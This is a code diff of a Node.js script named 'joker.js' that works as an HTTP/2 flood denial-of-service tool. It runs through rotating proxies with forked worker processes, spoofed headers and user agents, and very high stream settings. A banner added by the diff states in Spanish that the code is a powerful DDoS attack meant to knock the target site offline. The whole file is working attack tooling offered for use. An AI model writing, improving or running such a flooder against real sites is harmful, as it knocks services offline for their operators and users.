@@ -1,4 +1,3 @@
-// Importa los módulos necesarios
 const net = require('net');
 const http = require('http');
 const https = require('https'); // Para conexiones SSL/TLS
@@ -14,6 +13,29 @@ const cluster = require('cluster'); //Multi procesos
 require('events').EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
 });
+
+// Colores ANSI para la consola
+const red = '\x1b[31m';
+const reset = '\x1b[0m';
+
+const banner = `\x1b[31m
+======================================================================
+|                          ______  __ __ __________                    |
+|                         / / __ \\/ //_// ____/ __ \\                   |
+|                    __  / / / / / ,<  / __/ / /_/ /                   |
+|                   / /_/ / /_/ / /| |/ /___/ _, _/                    |
+|                   \\____/\\____/_/ |_/_____/_/ |_|                     |
+|                                                                      |
+|                                                                      |
+======================================================================
+|  Este es un código de ataque DDoS muy potente, y sirve para mandar   |
+|       tráfico web con información falsa al sitio deseado, para       |
+|             desestabilizar sus servidores y derribarlo.              |
+======================================================================
+|                                              By: ZeroEthical |
+======================================================================\x1b[0m`;
+
+console.log(banner);
 
 // Funciones de utilidad
 function generarHashMD5(data) {
@@ -73,7 +95,7 @@ function randomString(length) {
 //Proceso de Argumentos
  if (process.argv.length < 7){
  console.log(``);
- console.log(`node joker.js [url] [time] [rate] [threads] [proxy_file]`); process.exit();}
+ console.log(`\x1b[31m node joker.js [url] [time] [rate] [threads] [proxy_file]\x1b[0m`); process.exit();}
  const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
@@ -87,7 +109,7 @@ const HTTPS = "https://"
 
  const websocket = "websocket";
  const trailers = "trailers"
- const concu = "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH" // Puedes poner la lista de ciphers que quieras, o dejala vacía, el script igual funciona
+ const concu = "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM" // Puedes poner la lista de ciphers que quieras, o dejala vacía, el script igual funciona
  const randomHeaders = {
         "content-type": 'text/html; charset=utf-8',
         "upgrade-insecure-requests": '1',
@@ -113,11 +135,20 @@ const HTTPS = "https://"
        "Content-Encoding": 'gzip',
         "alt-svc": 'h3=":443"; ma=86400',
 }
+//Iniciación del ataque
+const parsedTarget = url.parse(args.target);
 
-  function runFlooder() {
+if (cluster.isMaster) {
+    console.log(banner);
+    for (let counter = 1; counter <= args.threads; counter++) {
+        cluster.fork();
+    }
+ }else {setInterval(runFlooder) }
+
+
+function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
-    const userAgentv2 = new UserAgent();
     var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = uap1;
@@ -140,7 +171,7 @@ const HTTPS = "https://"
 
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
-
+ 
          connection.setKeepAlive(true, 900000);
 
          const tlsOptions = {
@@ -155,7 +186,7 @@ const HTTPS = "https://"
             cloudflareMaxTimeout: 30000,
             ciphers: tls.getCiphers().join(":") + cipper,
             secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
-            servername: parsedTarget.host, // Use hostname, not URL
+            servername: url.hostname,
             socket: connection,
             honorCipherOrder: true,
             secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
@@ -165,15 +196,15 @@ const HTTPS = "https://"
             Compression: false,
             rejectUnauthorized: false,
             port: 443,
-            uri: parsedTarget.host, // Use hostname, not URL
-            servername: parsedTarget.host, // Use hostname, not URL
+            uri: parsedTarget.host,
+            servername: parsedTarget.host,
             sessionTimeout: 5000,
         };
 
          const tlsConn = tls.connect(443, parsedTarget.hostname, tlsOptions); 
 
          tlsConn.setKeepAlive(true, 60 * 10000);
-
+ 
          const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
@@ -188,8 +219,7 @@ const HTTPS = "https://"
              createConnection: () => tlsConn,
              socket: connection,
          });
-
-         client.settings({
+        client.settings({
             headerTableSize: 65536,
             maxConcurrentStreams: 20000,
             initialWindowSize: 6291456,
@@ -229,4 +259,4 @@ const HTTPS = "https://"
 
 function randomElement(elements) {
     return elements[Math.floor(Math.random() * elements.length)];
-  }
+   }
